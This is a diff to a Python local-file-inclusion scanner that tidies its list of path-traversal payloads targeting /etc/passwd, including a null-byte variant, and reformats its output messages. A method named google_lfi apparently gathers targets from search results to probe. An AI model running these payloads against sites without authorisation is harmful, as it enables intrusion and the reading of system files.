@@ -7,8 +7,9 @@ import entery
 
 class LFIScanner:
     def __init__(self):
-        self.lfi_payloads = ["../../../../../../../../../../../etc/passwd,../../../../../../../../../../../etc/passwd",
-                             "/etc/passwd", "/..././..././..././..././..././..././..././..././etc/passwd%00",
+        self.lfi_payloads = ["../../../../../../../../../../../etc/passwd",
+        		     "../../../../../../../../../../../etc/passwd",
+                             "/..././..././..././..././..././..././..././..././etc/passwd%00",
                              "../../../../../../../..//etc/passwd"]
 
     def google_lfi(self, num_results: int):
@@ -35,8 +36,7 @@ class LFIScanner:
                         response = requests.get(target_url)
                         if "root:x:" in response.text:
                             print(
-                                Fore.RED + Style.BRIGHT + "[+]" + Fore.GREEN + Style.BRIGHT + "LFI vulnerability "
-                                                                                              "found at " + Fore.RED
+                                Fore.RED + Style.BRIGHT + "[+]" + Fore.GREEN + Style.BRIGHT + "LFI vulnerability found at " + Fore.RED
                                 + Style.BRIGHT + f"{target_url}" + Style.RESET_ALL)
                         else:
                             print(
@@ -54,6 +54,7 @@ class LFIScanner:
             else:
                 print(Fore.BLUE + Style.BRIGHT + "[-]" + Fore.GREEN + Style.BRIGHT +"LFI is not found at %s%s" % (url, payload))
         return False
+
 
     def run(self):
         while True:
